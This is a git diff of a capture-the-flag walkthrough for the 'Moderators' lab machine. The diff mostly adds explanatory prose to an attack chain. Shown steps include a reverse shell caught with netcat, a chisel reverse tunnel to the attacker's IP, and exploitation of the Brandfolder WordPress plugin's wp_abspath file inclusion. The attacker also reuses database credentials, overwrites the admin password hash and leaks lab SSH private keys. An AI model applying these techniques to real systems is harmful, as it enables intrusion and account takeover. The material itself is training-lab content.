@@ -1,4 +1,4 @@
-![image](https://user-images.githubusercontent.com/105310322/195453417-4c83a7a0-f28d-4e52-8dac-4e01ca07a364.png)
+
 
 ### Tools: Feroxbuster, ffuf, python, chisel, vbox
 
@@ -164,6 +164,7 @@ Note2: Also be sure to rename the file if you fail since the files do not get ov
 
 ![image](https://user-images.githubusercontent.com/105310322/194648359-03a0333b-00f3-467f-9306-0353c31b93fe.png)
 
+Throwing the following PHP script in the pdf file will allow us to read the disabled functions in order to better assess we reverse shells we may use.
 
 ```
 <?php
@@ -191,14 +192,15 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 ```
-
 ```console
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@moderators:/tmp$ 
 ```
 
-lexi         877  0.0  0.8 228360 31968 ?        S    16:27   0:00      _ /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
+Linpeas shows us that hiding in /opt/site.new is a wordpress webpage and that there is a something running on port 8080 which is likely our webpage.
 
+
+```console
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                 
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                             
@@ -207,9 +209,9 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      -  
+```
 
-
-
+```console
 www-data@moderators:/tmp$ ls -la /opt/site.new
 ls -la /opt/site.new
 total 228
@@ -236,7 +238,9 @@ drwxr-xr-x 26 lexi moderators 12288 Jul 14 10:50 wp-includes
 -rw-r--r--  1 lexi moderators 31959 Jan 29  2022 wp-signup.php
 -rw-r--r--  1 lexi moderators  4747 Sep 11  2021 wp-trackback.php
 -rw-r--r--  1 lexi moderators  3236 Sep 11  2021 xmlrpc.php
+```
 
+Lets set up a quick chisel server and access this wordpress site.
 
 ```console
 └─$ chisel server --reverse --port 1235
@@ -255,25 +259,38 @@ www-data@moderators:/tmp$ ./chisel2 client 10.10.16.19:1235 R:8080:localhost:808
 2022/10/07 21:36:11 client: Connected (Latency 29.036943ms)
 ```
 
+From /opt/site.new we can see all of the webpages on port 8080. Including a plugin called brandfolder.
 
+Using the following exploits Proof of Concept we can get an idea on how to craft our exploit.
 
 https://www.exploit-db.com/exploits/39591
 
+Make a directory in the following place.
 
-www-data@moderators:/tmp$ mkdir /var/www/html/logs/uploads/shell
-
-
-```
+```console
 www-data@moderators: mkdir -p /var/www/html/logs/uploads/wp/wp-admin/includes
 ```
-```
+
+Then add these files into the created directory with some php.
+
+
+```console
 www-data@moderators: echo '<?php ?>' > wp-admin/includes/media.php
-echo '<?php ?>' > wp-admin/includes/file.php
-echo '<?php ?>' > wp-admin/includes/image.php
-echo '<?php ?>' > wp-admin/includes/post.php
+www-data@moderators: echo '<?php ?>' > wp-admin/includes/file.php
+www-data@moderators: echo '<?php ?>' > wp-admin/includes/image.php
+www-data@moderators: echo '<?php ?>' > wp-admin/includes/post.php
+```
+Next copy our php shell and name it as wp-load.php and place it in  ```/var/www/html/logs/uploads/wp/```
+
+```console
+www-data@moderators: cp wp-load.php /var/www/html/logs/uploads/wp/
 ```
 
+Finally navigate or curl the site
+
 http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/
+
+If everything goes well we receieve our shell and can cat the user flag!
 
 ```console
 └─$ nc -lvnp 5555
@@ -290,6 +307,8 @@ lexi@moderators:~$ cat user.txt
 cat user.txt
 9f60****************************
 ```
+
+Grab the SSH key for a better shell and a checkpoit :)
 
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -333,6 +352,8 @@ J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==
 ```
 # John Privilege Escalation
 
+linpeas quickly gives us our next step with creds to a sql database.
+
 ```console
 ╔══════════╣ Analyzing Wordpress Files (limit 70)
 -rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
@@ -341,6 +362,7 @@ define( 'DB_USER', 'wordpressuser' );
 define( 'DB_PASSWORD', 'wordpresspassword123!!' );
 define( 'DB_HOST', 'localhost' );
 ```
+After logging in and locating the users and passwords we find some hashes.
 
 ```console
 lexi@moderators:/tmp$ mysql -u wordpressuser -p
@@ -401,33 +423,42 @@ MariaDB [wordpress]> select * from wp_users;
 +----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+
 2 rows in set (0.001 sec)
 ```
-```
-└─$ ssh -L 8080:localhost:8080 -i id_rsa lexi@10.129.43.133 
-```
+
+These hashes are wordpress MD5 hashes. I tried cracking them but to no avail. The real way was simpler and just involved replacing them.
+
+
+The link to hacktricks below gives a good example of how to set a new password.
 
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
 
-```console
-└─$ echo '$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0' > hash
-└─$ hashcat hash /usr/share/wordlists/rockyou.txt
+Before that we need to create a new hashed password. The link below is a simple online generator.
 
-```
 https://www.useotools.com/wordpress-password-hash-generator
 
-Password must be hashed to run the password
+Now that we have our command and our hashed password we can set a new password.
+
+Note: It's important that you change the tables and columns to match your database and not the default from hacktricks.
 
 ```console
 MariaDB [wordpress]> UPDATE wp_users SET user_pass='$P$BL7sipqsbDoZ7yvWY9PxnY.OkXBVik/' WHERE user_login='admin';
 Query OK, 1 row affected (0.007 sec)
 Rows matched: 1  Changed: 1  Warnings: 0
 ```
-sudo vim /etc/hosts
-add moderators.htb to localhost
 
+Now that the password is changed we can finally access the wordpress site.
+
+Note: Be sure to add moderators.htb to your hosts file for the IP 127.0.0.1
+
+Navigate to http://moderators.htb/wp-login.php and login with the password you created.
 
 ![image](https://user-images.githubusercontent.com/105310322/195166895-12278582-196a-4555-9ee9-3d41e7f45499.png)
 
 ![image](https://user-images.githubusercontent.com/105310322/195166832-08ab62be-bf7c-4051-9717-f81fc3234d77.png)
+
+
+Hiding in nearly plain site is the ssh key for John!
+
+Also is super good friend Carl..
 
 
 ```
@@ -470,6 +501,9 @@ FQGVHxktaFKkrEl71gqoHPll8zNwNY9BjpxFPy48B1RgkxkfHSNZ8ujSI6Wse3tX6T03HD
 fotkBDyCmCDxz3AAAAD2pvaG5AbW9kZXJhdG9ycwECAw==
 -----END OPENSSH PRIVATE KEY-----
 ```
+
+```console
+john@moderators:
 
 ```console
 john@moderators:~/stuff/VBOX$ ls -la
